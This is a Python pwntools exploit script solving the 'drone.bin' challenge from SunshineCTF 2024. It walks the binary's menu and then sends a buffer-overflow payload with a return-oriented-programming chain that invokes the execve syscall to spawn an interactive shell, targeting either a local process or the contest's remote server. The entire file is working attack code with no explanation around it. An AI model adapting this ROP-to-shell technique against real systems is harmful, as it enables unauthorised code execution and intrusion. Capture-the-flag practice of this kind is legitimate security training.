#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './drone.bin'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '2024.sunshinectf.games', 24004

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x0401e16
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec drone.bin 
#     Arch:     amd64-64-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

POP_RDI = 0x00401499
POP_RAX_RSI_SYSCALL = 0x00402119
POP_RDX_RCX = 0x00401748

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'>>>', b'SAFE')
    io.sendlineafter(b'>>>', b'N')

    io.sendlineafter(b'>>>', b'CAMO')
    io.sendlineafter(b'>>>', b'I')

    payload = flat({
        256+8: [
            POP_RDX_RCX,
            0x0,
            0x0,
            POP_RDI,
            0x405914,
            POP_RAX_RSI_SYSCALL,
            0x3b,
            0x0,
        ]
    })
    io.sendline(payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()
